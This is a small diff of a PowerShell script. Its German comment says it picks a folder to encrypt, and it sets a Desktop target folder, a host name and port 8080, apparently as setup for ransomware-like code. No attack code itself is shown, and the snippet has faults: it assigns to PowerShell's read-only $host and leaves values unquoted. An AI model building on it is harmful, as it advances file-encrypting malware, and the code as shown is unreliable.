@@ -1,6 +1,6 @@
 #wir stellen erstmal fest, welches Folder wir verschlüsseln..
 $username=$env:USERNAME
-$host=mbggo
+$host=mbgogo
 $folder=foo
 $folderPath = "C:\Users\$username\Desktop\$folder"
 $port=8080
